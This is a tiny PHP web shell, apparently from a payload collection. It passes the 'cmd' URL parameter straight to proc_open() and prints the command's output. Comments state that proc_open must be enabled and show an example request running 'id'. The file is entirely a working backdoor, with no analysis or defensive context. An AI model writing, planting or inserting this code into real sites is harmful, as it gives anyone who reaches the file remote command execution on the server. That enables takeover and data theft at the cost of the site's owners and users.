# This will only work if the proc_open() function is enabled and not disabled in the PHP configuration.
# Execution: http://example.com/webshell_proc_open.php?cmd=id

<?php
$descriptorspec = [
 0 => ["pipe","r"],
 1 => ["pipe","w"],
 2 => ["pipe","w"]
];

$p = proc_open($_GET['cmd'], $descriptorspec, $pipes);
echo stream_get_contents($pipes[1]);
proc_close($p);
?>